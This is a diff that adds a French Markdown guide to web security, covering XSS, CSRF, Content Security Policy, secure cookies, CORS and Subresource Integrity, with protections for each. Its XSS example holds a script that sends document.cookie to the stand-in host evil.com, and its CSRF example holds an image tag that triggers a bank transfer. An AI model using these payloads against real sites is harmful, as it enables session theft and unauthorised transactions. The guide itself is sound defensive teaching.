@@ -1,0 +1,140 @@
+---
+title: Securite Web avancee
+category: web
+description: XSS, CSRF, CSP, cookies securises et protections web modernes
+tags: [xss, csrf, csp, cookies, headers, securite-web]
+---
+
+## Cross-Site Scripting (XSS)
+
+Injection de code JavaScript malveillant dans une page web.
+
+### Types de XSS
+
+| Type | Persistance | Vecteur |
+|------|-------------|---------|
+| **Reflected** | Non | URL, parametres GET |
+| **Stored** | Oui | Base de donnees, commentaires |
+| **DOM-based** | Non | Manipulation du DOM cote client |
+
+### Exemple d'attaque
+
+```html
+<!-- Vulnerable -->
+<div>Bienvenue, {{ username }}</div>
+
+<!-- Attaque -->
+<div>Bienvenue, <script>document.location='https://evil.com/steal?c='+document.cookie</script></div>
+```
+
+### Protection
+
+- **Echappement** : encoder les sorties HTML (`&lt;` au lieu de `<`)
+- **CSP** : Content Security Policy qui bloque les scripts inline
+- **Frameworks** : React, Vue, Angular echappent automatiquement
+- **HttpOnly** : cookies inaccessibles via JavaScript
+
+---
+
+## Cross-Site Request Forgery (CSRF)
+
+Forcer un utilisateur authentifie a executer une action a son insu.
+
+### Exemple
+
+```html
+<!-- Sur evil.com, l'image declenche un transfert -->
+<img src="https://bank.com/transfer?to=attacker&amount=10000" />
+```
+
+### Protection
+
+- **Token CSRF** : token unique par session, verifie cote serveur
+- **SameSite cookies** : `SameSite=Strict` ou `SameSite=Lax`
+- **Double Submit Cookie** : token dans le cookie ET dans le formulaire
+- **Verifier l'en-tete Origin/Referer**
+
+---
+
+## Content Security Policy (CSP)
+
+Politique qui controle les sources de contenu autorisees.
+
+```
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' 'nonce-abc123';
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: https:;
+  connect-src 'self' https://api.example.com;
+  font-src 'self' https://fonts.gstatic.com;
+  frame-ancestors 'none';
+  base-uri 'self';
+  form-action 'self';
+```
+
+### Directives cles
+
+| Directive | Controle |
+|-----------|----------|
+| `default-src` | Source par defaut pour tout |
+| `script-src` | Sources JavaScript autorisees |
+| `style-src` | Sources CSS autorisees |
+| `img-src` | Sources d'images autorisees |
+| `connect-src` | URLs pour fetch, XHR, WebSocket |
+| `frame-ancestors` | Qui peut embarquer la page (remplace X-Frame-Options) |
+
+---
+
+## Cookies securises
+
+```
+Set-Cookie: session=abc123;
+  Secure;           // HTTPS uniquement
+  HttpOnly;         // Pas d'acces JavaScript
+  SameSite=Lax;     // Protection CSRF
+  Path=/;
+  Max-Age=3600;     // Expiration 1h
+  Domain=.example.com;
+```
+
+| Attribut | Effet |
+|----------|-------|
+| `Secure` | Cookie envoye uniquement sur HTTPS |
+| `HttpOnly` | Inaccessible via `document.cookie` |
+| `SameSite=Strict` | Jamais envoye en cross-site |
+| `SameSite=Lax` | Envoye en navigation top-level GET |
+| `SameSite=None` | Toujours envoye (requiert `Secure`) |
+
+---
+
+## CORS (Cross-Origin Resource Sharing)
+
+```
+Access-Control-Allow-Origin: https://app.example.com
+Access-Control-Allow-Methods: GET, POST
+Access-Control-Allow-Headers: Content-Type, Authorization
+Access-Control-Allow-Credentials: true
+Access-Control-Max-Age: 86400
+```
+
+**Regles :**
+- Ne jamais utiliser `Access-Control-Allow-Origin: *` avec credentials
+- Valider l'origin contre une allowlist cote serveur
+- Preflight (OPTIONS) pour les requetes non-simple
+
+---
+
+## Subresource Integrity (SRI)
+
+Verifier que les scripts tiers n'ont pas ete modifies.
+
+```html
+<script
+  src="https://cdn.example.com/lib.js"
+  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8w"
+  crossorigin="anonymous">
+</script>
+```
+
+<TerminalBlock command="shasum -a 384 lib.js | xxd -r -p | base64" output="Generer le hash SRI d'un fichier" />
